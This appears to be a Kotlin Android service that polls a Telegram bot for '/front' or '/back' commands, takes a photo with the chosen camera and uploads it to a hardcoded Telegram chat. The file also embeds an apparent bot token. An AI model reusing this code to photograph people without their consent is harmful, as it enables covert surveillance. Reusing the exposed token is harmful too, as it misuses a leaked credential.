package com.example.telegramcamerabot

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.net.URL

class CameraService : LifecycleService() {
    private var cameraProvider: ProcessCameraProvider? = null
    private var imageCapture: ImageCapture? = null
    private val handler = Handler(Looper.getMainLooper())
    private val botToken = "7841292010:AAFwHtkaSveg8r_nzzzNXJewNCPxeVKvA1o"
    private val chatId = "5142788570"
    private var lastUpdateId = 0

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForegroundService()
        initializeCamera()
        startPolling()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                "camera_channel",
                "Camera Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)
                ?.createNotificationChannel(serviceChannel)
        }
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, "camera_channel")
            .setContentTitle("Camera Service")
            .setContentText("Listening for Telegram commands")
            .setSmallIcon(R.drawable.ic_notification)
            .build()

        startForeground(1, notification)
    }

    private fun initializeCamera() {
        ProcessCameraProvider.getInstance(this).addListener({
            cameraProvider = ProcessCameraProvider.getInstance(this).get()
        }, ContextCompat.getMainExecutor(this))
    }

    private fun startPolling() {
        handler.post(object : Runnable {
            override fun run() {
                checkMessages()
                handler.postDelayed(this, 3000)
            }
        })
    }

    private fun checkMessages() {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}")
                val response = URL(url.toString()).readText()
                val json = JSONObject(response)
                val updates = json.getJSONArray("result")

                for (i in 0 until updates.length()) {
                    val update = updates.getJSONObject(i)
                    lastUpdateId = update.getInt("update_id")
                    val message = update.getJSONObject("message")
                    val text = message.getString("text")

                    when (text) {
                        "/front" -> captureImage(CameraSelector.LENS_FACING_FRONT)
                        "/back" -> captureImage(CameraSelector.LENS_FACING_BACK)
                    }
                }
            } catch (e: Exception) {
                Log.e("CameraService", "Error checking messages", e)
            }
        }.start()
    }

    private fun captureImage(lensFacing: Int) {
        val cameraSelector = CameraSelector.Builder()
            .requireLensFacing(lensFacing)
            .build()

        imageCapture = ImageCapture.Builder().build()

        try {
            cameraProvider?.unbindAll()
            cameraProvider?.bindToLifecycle(
                this,
                cameraSelector,
                imageCapture
            )

            val file = File(getExternalFilesDir(null), "${System.currentTimeMillis()}.jpg")
            val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()

            imageCapture?.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this),
                object : ImageCapture.OnImageSavedCallback {
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        sendPhoto(file)
                    }

                    override fun onError(exception: ImageCaptureException) {
                        Log.e("CameraService", "Error capturing image", exception)
                    }
                }
            )
        } catch (e: Exception) {
            Log.e("CameraService", "Error initializing camera", e)
        }
    }

    private fun sendPhoto(file: File) {
        Thread {
            try {
                val client = OkHttpClient()
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .build()

                val request = Request.Builder()
                    .url("https://api.telegram.org/bot$botToken/sendPhoto")
                    .post(requestBody)
                    .build()

                client.newCall(request).execute().close()
            } catch (e: IOException) {
                Log.e("CameraService", "Error sending photo", e)
            }
        }.start()
    }

    override fun onBind(intent: Intent): IBinder? = null
}
